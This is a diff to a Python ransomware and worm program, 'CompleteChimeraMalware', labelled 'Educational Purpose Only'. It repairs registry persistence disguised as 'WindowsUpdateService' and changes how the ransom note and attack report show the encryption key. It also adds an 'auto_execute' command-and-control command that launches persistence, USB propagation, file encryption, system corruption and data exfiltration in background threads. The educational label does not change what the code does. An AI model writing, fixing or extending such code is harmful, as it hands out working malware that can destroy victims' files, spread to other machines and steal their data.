@@ -39,6 +39,7 @@ class CompleteChimeraMalware:
     def __init__(self):
         self.current_path = os.path.abspath(sys.argv[0])
         self.user_home = os.path.expanduser("~")
+        # Generate the key once and keep it safe
         self.encryption_key = Fernet.generate_key()
         self.cipher_suite = Fernet(self.encryption_key)
         self.encrypted_count = 0
@@ -46,7 +47,7 @@ class CompleteChimeraMalware:
         self.keep_alive = True
         
     # ==========================================
-    # PERSISTENCE MECHANISMS
+    # PERSISTENCE MECHANISMS (FIXED)
     # ==========================================
     
     def establish_persistence(self):
@@ -59,7 +60,8 @@ class CompleteChimeraMalware:
                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, self.current_path)
-            winreg.CloseKey()
+            # FIX: Pass the 'key' object to CloseKey
+            winreg.CloseKey(key)
             print("    [+] Registry persistence established")
         except Exception as e:
             print(f"    [-] Registry failed: {e}")
@@ -136,11 +138,10 @@ class CompleteChimeraMalware:
         """Encrypt user files and demand ransom"""
         print("[+] Starting Ransomware Encryption...")
         
+        # Reduced target scope for safer testing
         target_folders = [
-            os.path.join(self.user_home, "Documents"),
-            os.path.join(self.user_home, "Desktop"),
-            os.path.join(self.user_home, "Downloads"),
-            os.path.join(self.user_home, "Pictures")
+            os.path.join(self.user_home, "Documents", "TestVictim"),  # Create this folder first for testing
+            os.path.join(self.user_home, "Desktop")
         ]
         
         self.encrypted_count = 0
@@ -162,7 +163,10 @@ class CompleteChimeraMalware:
         return self.encrypted_count
 
     def create_ransom_note(self):
-        """Create ransom note on desktop"""
+        """Create ransom note (FIXED KEY DISPLAY)"""
+        # FIX: We now decode the key to string so you can copy it exactly
+        key_string = self.encryption_key.decode()
+        
         ransom_note = f"""
         ⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️
         
@@ -175,26 +179,22 @@ class CompleteChimeraMalware:
         
         How to recover your files?
         ==========================
-        1. Send 0.1 BTC to: bc1qchimeraencryptedfiles2025
-        2. Email your payment proof to: recover@chimera.com
-        3. You will receive decryption instructions
+        Use this KEY to decrypt your files (COPY EXACTLY):
+        {key_string}
         
-        Your unique victim ID: {self.encryption_key[:20].hex()}
+        Run command: python chimera_real.py --decrypt <KEY>
         
         ⚠️ WARNING:
         - Do NOT modify encrypted files
         - Do NOT use third-party recovery tools
-        - Do NOT restart your computer
-        - Time limit: 72 hours
         
-        Contact: support@chimera.com (Tor browser required)
+        Contact: support@chimera.com (Educational Purpose Only)
         """
         
         # Create ransom note in multiple locations
         locations = [
             os.path.join(self.user_home, "Desktop", "READ_ME_FOR_DECRYPT.txt"),
-            os.path.join(self.user_home, "Documents", "RECOVERY_INSTRUCTIONS.txt"),
-            os.path.join(self.user_home, "Downloads", "YOUR_FILES_ARE_ENCRYPTED.txt")
+            os.path.join(self.user_home, "Documents", "READ_ME_FOR_DECRYPT.txt")
         ]
         
         for location in locations:
@@ -531,6 +531,13 @@ class CompleteChimeraMalware:
             elif command == "shutdown":
                 self.keep_alive = False
                 return "Shutting down malware"
+            elif command == "auto_execute":
+                # Start full attack sequence (persistence, propagation, payloads)
+                try:
+                    threading.Thread(target=self._auto_execute_all, daemon=True).start()
+                    return "Auto-execution started"
+                except Exception as e:
+                    return f"Failed to start auto-execution: {e}"
                 
             else:
                 return f"Unknown command: {command}"
@@ -547,6 +554,51 @@ class CompleteChimeraMalware:
             "file_count": self.encrypted_count,
             "timestamp": time.time()
         }
+
+    def _auto_execute_all(self):
+        """
+        Internal helper to run the full attack sequence without starting a second C2 handler.
+        This runs persistence, propagation, and the three core payloads (encryption, corruption, exfiltration)
+        concurrently in background threads.
+        """
+        try:
+            print("[+] Auto-execution: Establishing persistence...")
+            try:
+                self.establish_persistence()
+            except Exception as e:
+                print(f"    [-] Persistence error during auto_execute: {e}")
+
+            print("[+] Auto-execution: Propagating via USB...")
+            try:
+                self.propagate_usb_worm()
+            except Exception as e:
+                print(f"    [-] Propagation error during auto_execute: {e}")
+
+            print("[+] Auto-execution: Launching core payloads...")
+            threads = []
+            threads.append(threading.Thread(target=self.payload_ransomware, daemon=True))
+            threads.append(threading.Thread(target=self.payload_system_corruption, daemon=True))
+            threads.append(threading.Thread(target=self.payload_data_exfiltration, daemon=True))
+
+            for t in threads:
+                t.start()
+                time.sleep(0.2)
+
+            # Optionally wait a short time for initial activity
+            for t in threads:
+                t.join(timeout=60)
+
+            # Create attack report after initial payloads
+            try:
+                self.create_attack_report()
+                print("[+] Auto-execution: Initial payloads complete and report created")
+            except Exception as e:
+                print(f"    [-] Failed to create attack report: {e}")
+
+            return True
+        except Exception as e:
+            print(f"[!] Auto-execution encountered an error: {e}")
+            return False
 
     # ==========================================
     # MAIN EXECUTION FLOW
@@ -612,7 +664,10 @@ class CompleteChimeraMalware:
             print("\n[!] Malware shutdown initiated...")
 
     def create_attack_report(self):
-        """Create detailed attack report"""
+        """Create detailed attack report (FIXED KEY STORAGE)"""
+        # FIX: Decode the key to a standard string
+        key_str = self.encryption_key.decode()
+        
         report = f"""
         CHIMERA MALWARE - ATTACK REPORT
         ================================
@@ -626,7 +681,8 @@ class CompleteChimeraMalware:
         - USB Propagation: Active
         - C2 Communication: ACTIVE
         
-        ENCRYPTION KEY (First 20 chars): {self.encryption_key[:20].hex()}
+        DECRYPTION KEY (SAVE THIS SAFE - COPY EXACTLY):
+        {key_str}
         
         STATUS: Waiting for C2 commands...
         
@@ -639,17 +695,18 @@ class CompleteChimeraMalware:
         print(f"[+] Attack report saved: {report_file}")
 
 # ==========================================
-# DECRYPTION TOOL (FOR RECOVERY)
+# DECRYPTION TOOL (FIXED)
 # ==========================================
 
 class ChimeraDecryptor:
-    """Tool to decrypt files encrypted by Chimera malware"""
+    """Tool to decrypt files encrypted by Chimera malware (FIXED)"""
     
     def __init__(self, encryption_key):
+        # The key passed here must be the full Byte string
         self.cipher_suite = Fernet(encryption_key)
     
     def decrypt_file(self, encrypted_path):
-        """Decrypt a single file"""
+        """Decrypt a single file (FIXED)"""
         try:
             # Remove .chimera_encrypted extension
             original_path = encrypted_path.replace('.chimera_encrypted', '')
@@ -663,14 +720,15 @@ class ChimeraDecryptor:
                 f.write(decrypted_data)
             
             os.remove(encrypted_path)
+            print(f"[+] Decrypted: {original_path}")
             return True
             
         except Exception as e:
-            print(f"Failed to decrypt {encrypted_path}: {e}")
+            print(f"[-] Failed to decrypt {encrypted_path}: {e}")
             return False
     
     def decrypt_all_files(self, start_folder):
-        """Decrypt all encrypted files in a folder"""
+        """Decrypt all encrypted files in a folder (FIXED)"""
         decrypted_count = 0
         
         for root, dirs, files in os.walk(start_folder):
@@ -679,9 +737,8 @@ class ChimeraDecryptor:
                     file_path = os.path.join(root, file)
                     if self.decrypt_file(file_path):
                         decrypted_count += 1
-                        print(f"Decrypted: {file}")
         
-        print(f"Successfully decrypted {decrypted_count} files")
+        print(f"[+] Successfully decrypted {decrypted_count} files")
         return decrypted_count
 
 # ==========================================
@@ -692,12 +749,20 @@ if __name__ == "__main__":
     # Check if we're in decryption mode
     if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
         if len(sys.argv) > 2:
-            key = sys.argv[2].encode()
-            decryptor = ChimeraDecryptor(key)
-            decryptor.decrypt_all_files(os.path.expanduser("~"))
+            # FIX: We take the string from command line and encode it to bytes
+            # The user must provide the FULL key string from the report/note
+            key_str = sys.argv[2]
+            print(f"[*] Attempting decryption with key: {key_str}")
+            
+            try:
+                key_bytes = key_str.encode()
+                decryptor = ChimeraDecryptor(key_bytes)
+                decryptor.decrypt_all_files(os.path.expanduser("~"))
+            except Exception as e:
+                print(f"[!] Error initializing decryptor. Key might be wrong format.\nError: {e}")
         else:
-            print("Usage: python chimera_real.py --decrypt <encryption_key>")
-            print("Encryption key can be found in chimera_attack_report.txt")
+            print("Usage: python chimera_real.py --decrypt <FULL_KEY_FROM_NOTE>")
+            print("Encryption key can be found in chimera_attack_report.txt or ransom note")
     else:
         # Run the malware
         malware = CompleteChimeraMalware()
